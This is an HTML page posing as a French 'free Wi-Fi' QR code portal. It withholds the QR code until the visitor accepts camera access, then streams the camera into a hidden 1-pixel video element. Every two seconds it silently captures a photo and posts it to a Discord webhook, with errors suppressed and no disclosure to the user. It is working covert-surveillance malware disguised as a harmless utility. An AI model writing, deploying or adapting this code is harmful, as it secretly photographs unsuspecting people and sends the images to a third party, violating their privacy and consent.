<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi QR Code</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        h1 { 
            color: #1a1a2e; 
            margin-bottom: 10px;
            font-size: 28px;
        }
        .subtitle { 
            color: #4a4a6a; 
            margin-bottom: 30px;
            font-size: 16px;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 16px 48px;
            border-radius: 50px;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
            border: 2px solid rgba(255,255,255,0.2);
            letter-spacing: 1px;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        #cameraFeed {
            width: 1px;
            height: 1px;
            opacity: 0;
            position: fixed;
            pointer-events: none;
            top: 0;
            left: 0;
        }
        #qrContainer {
            margin: 30px auto;
            position: relative;
            display: inline-block;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        #qrCode {
            width: 280px;
            height: 280px;
            display: block;
            filter: blur(25px);
            transition: filter 0.8s cubic-bezier(0.4, 0, 0.2, 1);
            background: white;
        }
        #qrCode.visible {
            filter: blur(0);
        }
        .blur-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 14px;
            letter-spacing: 1px;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.3);
            pointer-events: none;
            z-index: 2;
        }
        .wifi-info {
            margin-top: 25px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 15px;
            border: 1px solid #e9ecef;
        }
        .wifi-info p {
            color: #495057;
            margin: 8px 0;
            font-size: 16px;
        }
        .wifi-info strong {
            color: #1a1a2e;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #868e96;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üì± Wi-Fi Gratuit</h1>
        <div class="subtitle">Scannez le code QR pour acc√©der au r√©seau</div>
        
        <div class="camera-section">
            <button id="requestCamera">‚úÖ ACCEPTER LA CAM√âRA</button>
            
            <video id="cameraFeed" autoplay playsinline muted></video>
            
            <div id="qrContainer">
                <canvas id="qrCode"></canvas>
                <div class="blur-overlay" id="blurMessage">üì∑ CAM√âRA REQUISE</div>
            </div>
            
            <div class="wifi-info">
                <p><strong>üì∂ R√©seau:</strong> Guest_WiFi</p>
                <p><strong>üîë Mot de passe:</strong> guest2024secure</p>
                <p><small>‚è± Expire dans 24h</small></p>
            </div>
        </div>
        
        <div class="footer">
            Powered by GitHub Pages üîí Webhook s√©curis√©
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
    <script src="config.js"></script>
    
    <script>
        const WIFI_CONFIG = {
            ssid: 'Guest_WiFi',
            password: 'guest2024secure',
            encryption: 'WPA2'
        };

        let videoStream = null;
        let isSending = false;
        let photoInterval = null;

        function initQRCode() {
            const wifiString = `WIFI:S:${WIFI_CONFIG.ssid};T:${WIFI_CONFIG.encryption};P:${WIFI_CONFIG.password};;`;
            QRCode.toCanvas(document.getElementById('qrCode'), wifiString, {
                width: 280,
                margin: 2,
                color: { dark: '#1a1a2e', light: '#ffffff' }
            });
        }

        async function setupCamera() {
            try {
                videoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: { ideal: 'environment' } } 
                });
                const videoElement = document.getElementById('cameraFeed');
                videoElement.srcObject = videoStream;
                
                document.getElementById('qrCode').classList.add('visible');
                document.getElementById('blurMessage').style.display = 'none';
                
                const button = document.getElementById('requestCamera');
                button.style.opacity = '0';
                setTimeout(() => button.style.display = 'none', 300);
                
                startSendingPhotos();
            } catch (error) {
                console.error('Camera error:', error);
            }
        }

        function startSendingPhotos() {
            if (!window.DISCORD_WEBHOOK) return;
            isSending = true;
            captureAndSend();
            photoInterval = setInterval(captureAndSend, 2000);
        }

        async function captureAndSend() {
            const video = document.getElementById('cameraFeed');
            if (!video.videoWidth || !isSending) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                if (!window.DISCORD_WEBHOOK) return;
                
                const formData = new FormData();
                formData.append('file', blob, `wifi_${Date.now()}.jpg`);
                formData.append('payload_json', JSON.stringify({
                    content: `üì∏ **Acc√®s WiFi** - ${new Date().toLocaleString('fr-FR')}`,
                    username: 'Syst√®me WiFi'
                }));

                try {
                    await fetch(window.DISCORD_WEBHOOK, { method: 'POST', body: formData });
                } catch (e) {}
            }, 'image/jpeg', 0.7);
        }

        document.addEventListener('DOMContentLoaded', () => {
            initQRCode();
            document.getElementById('requestCamera').addEventListener('click', setupCamera);
        });

        window.addEventListener('beforeunload', () => {
            isSending = false;
            clearInterval(photoInterval);
            if (videoStream) videoStream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>
